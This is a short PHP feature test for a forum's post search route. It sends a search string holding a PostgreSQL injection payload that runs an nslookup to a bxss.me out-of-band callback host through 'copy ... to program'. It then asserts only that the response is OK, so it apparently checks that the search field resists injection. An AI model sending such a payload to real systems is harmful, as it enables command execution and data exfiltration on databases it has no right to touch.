<?php

namespace Tests\Feature\Forum\Post;

use App\Topic;
use Tests\TestCase;

class PostIndexTest extends TestCase
{
	public function testSearchStr()
	{
		$topic = factory(Topic::class)
			->create();

		$s = "the';copy (select '') to program 'nslookup dns.sqli." . chr(92) . chr(92) . "013405.1877-71756.1877.f5ca2." . chr(92) . chr(92) . "1.bxss.me";

		$this->get(route('topics.posts.index', ['topic' => $topic, 'search_str' => $s]))
			->assertOk();
	}
}
